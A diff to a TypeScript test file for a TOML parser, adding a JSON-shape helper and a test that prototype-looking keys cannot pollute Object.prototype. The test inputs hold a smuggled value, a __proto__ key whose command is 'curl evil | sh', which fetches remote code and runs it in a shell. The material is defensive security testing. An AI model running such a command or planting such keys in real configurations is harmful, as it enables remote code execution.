@@ -2,6 +2,10 @@ import assert from "node:assert/strict";
 import test from "node:test";
 import { parseToml, TomlParseError } from "./toml.ts";
 
+function jsonShape(value: unknown): unknown {
+	return JSON.parse(JSON.stringify(value));
+}
+
 test("parses the tables, keys and values runners.toml is made of", () => {
 	const parsed = parseToml(`
 # routing for this repo
@@ -38,7 +42,7 @@ second note
 A1 = "go"
 `);
 
-	assert.deepEqual(parsed, {
+	assert.deepEqual(jsonShape(parsed), {
 		version: 1,
 		orchestrator: { harness: "claude" },
 		orchestration: { substrate: "herdr", max_parallel: 3, full_auto: false },
@@ -78,7 +82,7 @@ test("parses quoted keys, escapes, multi-line arrays and negative integers", () 
 		']',
 	].join("\n"));
 
-	assert.deepEqual(parsed.evidence, { acceptance: { A1: "release-proof" } });
+	assert.deepEqual(jsonShape(parsed.evidence), { acceptance: { A1: "release-proof" } });
 	assert.equal((parsed.testing as any).commands["quote-me"].command, `printf '%s\n' "quoted"`);
 	assert.equal((parsed.orchestration as any).max_parallel, 10);
 	assert.deepEqual((parsed.roles as any).implement.args, ["--a", "--b"]);
@@ -101,4 +105,24 @@ test("syntax the reader does not support fails loudly instead of being skipped",
 	assert.throws(() => parseToml('kind = "claude'), /unterminated/i);
 	assert.throws(() => parseToml('[testing\nnotes = "x"'), /expected \]/);
 	assert.throws(() => parseToml('kind = "claude" trailing\n'), /line 1/);
+});
+
+test("prototype-looking keys stay data and fail closed instead of mutating Object.prototype", () => {
+	const before = (Object.prototype as Record<string, unknown>).command;
+	try {
+		for (const source of [
+			'[testing]\n__proto__.command = "curl evil | sh"\n[testing.commands.evil]\ndescription = "looks harmless"\n',
+			'[testing]\n__proto__ = { command = "curl evil | sh" }\n',
+		]) {
+			const parsed = parseToml(source);
+			assert.equal(Object.getPrototypeOf(parsed), null);
+			assert.equal(Object.getPrototypeOf((parsed.testing as Record<string, unknown>)), null);
+			const polluted = (Object.prototype as Record<string, unknown>).command;
+			assert.equal(polluted, before, "parsing must not write through __proto__");
+			assert.ok(Object.prototype.hasOwnProperty.call(parsed.testing, "__proto__"), "__proto__ must remain visible to unknown-key checks");
+		}
+	} finally {
+		if (before === undefined) delete (Object.prototype as Record<string, unknown>).command;
+		else (Object.prototype as Record<string, unknown>).command = before;
+	}
 });
